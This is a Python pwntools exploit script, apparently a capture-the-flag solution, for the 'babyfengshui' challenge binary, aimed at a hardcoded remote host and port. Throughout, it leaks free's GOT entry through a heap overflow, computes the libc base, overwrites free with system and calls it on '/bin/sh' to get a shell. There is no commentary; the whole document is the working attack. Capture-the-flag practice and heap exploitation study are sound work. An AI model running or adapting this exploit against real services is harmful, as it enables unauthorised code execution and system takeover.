from pwn import *
#context.log_level = 'debug'
debug = 0
if debug:
    context.terminal = ['tmux', 'splitw', '-h']
    p = process("./babyfengshui")
    libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
else:
    libc = ELF("/home/ubuntu/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so")
    p = remote("111.198.29.45", 36546)

def add(name, size, length, context):
    p.recvuntil("Action: ")
    p.sendline("0")
    p.recvuntil("size of description: ")
    p.sendline(str(size))
    p.recvuntil("name: ")
    p.sendline(name)
    p.recvuntil("text length: ")
    p.sendline(str(length))
    p.recvuntil("text: ")
    p.sendline(context)

def dele(index):
    p.recvuntil("Action: ")
    p.sendline("1")
    p.recvuntil("index: ")
    p.sendline(str(index))

def dis(index):
    p.recvuntil("Action: ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("description: ")
    description = p.recvuntil("\x0a",drop=True)
    return description

def update(index, length, context):
    p.recvuntil("Action: ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("text length: ")
    p.sendline(str(length))
    p.recvuntil("text: ")
    p.sendline(context)

elf = ELF("./babyfengshui")

#gdb.attach(p)
add("sun",0x80,0x80,"a")
add("sun",0x80,0x80,"b")
add("sun",0x10,0x10,"/bin/sh\x00")

dele(0)
# bypass to overflow
add("sun",0x100,0x19c,"a"*0x198+p32(elf.got["free"]))
free_addr = u32(dis(1)[0:4])
print hex(free_addr)
libc_base = free_addr - libc.symbols['free']

sys_addr = libc_base + libc.symbols["system"]

update(1,0x5,p32(sys_addr))
dele(2)

p.interactive()
